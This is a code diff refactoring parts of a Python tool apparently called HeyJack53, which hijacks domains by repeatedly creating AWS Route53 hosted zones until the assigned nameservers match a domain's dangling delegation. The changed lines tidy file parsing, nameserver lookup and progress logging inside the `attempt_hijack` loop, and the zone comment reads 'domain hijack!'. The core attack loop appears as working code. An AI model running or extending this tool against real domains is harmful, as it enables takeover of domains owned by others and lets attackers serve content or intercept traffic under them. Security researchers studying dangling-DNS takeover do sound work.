@@ -49,8 +49,10 @@ def get_domains_list(args):
     if args.file:
         try:
             with open(args.file, 'r', encoding='utf-8') as f:
-                domains.extend([line.strip() for line in f 
-                              if line.strip() and not line.strip().startswith('#')])
+                for line in f:
+                    stripped = line.strip()
+                    if stripped and not stripped.startswith('#'):
+                        domains.append(stripped)
         except Exception as e:
             logging.error(f"Error reading file {args.file}: {e}")
             sys.exit(1)
@@ -60,12 +62,8 @@ def get_domains_list(args):
 
 def get_nameservers(domain, custom_nameservers=None, verbose=False):
     """Get nameservers for a domain."""
-    if custom_nameservers:
-        if custom_nameservers[0]:
-            return set(custom_nameservers[0])
-        else:
-            logging.warning("Custom nameservers provided but empty")
-            return None
+    if custom_nameservers and custom_nameservers[0]:
+        return set(custom_nameservers[0])
     
     try:
         if verbose:
@@ -154,15 +152,15 @@ def attempt_hijack(domain, target_nameservers, route53_client, verbose=False):
             counter += 1
             if verbose:
                 logging.info(f'Attempt #{counter}')
-            else:
-                # Print progress dot for non-verbose mode
-                print('.', end='', flush=True)
+            elif counter % 10 == 0:
+                # Print progress every 10 attempts in non-verbose mode
+                logging.info(f'Attempt #{counter}...')
             
             try:
                 new_zone = route53_client.create_hosted_zone(
                     Name=domain,
                     HostedZoneConfig={'Comment': 'HeyJack53 domain hijack!'},
-                    CallerReference=f'HeyJack53_{domain}_{datetime.now()}'
+                    CallerReference=f'HeyJack53_{domain}_{datetime.now().strftime("%Y%m%d_%H%M%S_%f")}'
                 )
             except botocore.exceptions.ClientError as e:
                 if e.response['Error']['Code'] == 'Throttling':
